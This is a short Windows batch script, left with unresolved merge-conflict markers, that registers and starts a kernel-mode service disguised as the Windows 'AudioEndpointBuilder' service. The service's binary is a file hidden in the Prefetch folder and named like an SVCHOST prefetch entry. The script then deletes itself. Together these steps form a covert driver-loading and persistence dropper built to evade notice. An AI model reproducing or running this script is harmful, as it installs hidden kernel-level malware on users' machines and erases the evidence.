@echo off
cd %~dp0
<<<<<<< HEAD
sc create AudioEndpointBuilder_352 binpath=C:\Windows\Prefetch\SVCHOST.EXE-LB2XQ7N4.pf type=kernel
sc start AudioEndpointBuilder_352
=======
sc create AudioEndpointBuilder_515 binpath=C:\Windows\Prefetch\SVCHOST.EXE-M5S1KJ74.pf type=kernel
sc start AudioEndpointBuilder_515
>>>>>>> 76bd4804607508881a6ef17a5e0944ac0bc07bfa
del "%~f0"



